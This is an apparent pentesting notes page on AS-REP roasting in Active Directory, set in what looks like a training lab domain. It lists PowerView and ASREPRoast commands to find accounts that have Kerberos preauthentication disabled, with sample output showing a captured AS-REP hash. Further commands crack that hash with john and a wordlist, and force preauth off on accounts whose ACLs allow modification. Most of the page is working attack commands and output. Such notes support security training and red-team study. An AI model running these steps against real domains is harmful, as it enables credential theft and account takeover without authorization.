---
description: >-
  If a user's UserAccountControl settings have "Do not require Kerberos
  preauthentication" enabled, it is possible to grab user's crackable AS-REP and
  brute-force it offline.
---

# AS-REPs

{% hint style="info" %}
P**owerView\_dev** is used for this attack!
{% endhint %}

## Enumerating accounts

Enumerating account with Kerberos Preauth disabled

```text
Get-DomainUser -PreauthNotRequired -Verbose
```

## Get AS-REP hash

Use [**ASREPRoast**](https://github.com/HarmJ0y/ASREPRoast)\*\*\*\*

```text
Get-ASREPHash -UserName VPN1user -Verbose
```

Save the output of the command to txt file.

```text
PS C:\AD\Tools\ASREPRoast-master\ASREPRoast-master> Get-ASREPHash -UserName VPN182user -Verbose
VERBOSE: [Get-ASREPHash] DC server IP '172.16.2.1' resolved from current domain
VERBOSE: [Get-ASREPHash] Bytes sent to '172.16.2.1': 196
VERBOSE: [Get-ASREPHash] Bytes received from '172.16.2.1': 1498

$krb5asrep$VPN182user@dollarcorp.moneycorp.local:60b8b5ef9f6e8fe58443d04a8450590b$13db56ee13e58e3689512d83b9c36aeef2334b
1a719e0cb3a6473453446220b23dbf6178697f9980f992ef0a179019dff8e2a5659006669d292011ba33eece782c41ae5624bf7b45e671f68eb1fd52
b45c7e83b27afe16f0907acd36e1aed64b6c373736885acc9893eea29718cedd46a14993b11ec436388e85021fbd7c1532577fce07b48191851f971a
112d5d172cdae3702aeeda7b72df4f0c39bd3e35b8f6ed1765d764976127fd2fc3ced2d2dbe640016a0f2987c917e9e0be9c2603b696f86e2580c784
b2a6f63c370e653f4f1aa9604df926af8d15c888cf03fe59ebd4eaf36fc420ae86e3185c5a0916c06e5f05028fc088e7b6d06983fc5449d5d6c93465
57efb29831
```

Crack it with john

```text
john vpn182user.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Force disable Kerberos Preauth

> With sufficient rights \(GenericWrite or GenericAll\), Kerberos preauth can be forced disabled.

Enumerate permissions on ACLs for specific group:

```text
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Set preauth not required to the user we have permissions to modify.

```text
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} â€“Verbose
```

Verify applied UserAccountControl

```text
Get-DomainUser -PreauthNotRequired -Identity ControlXUser
```

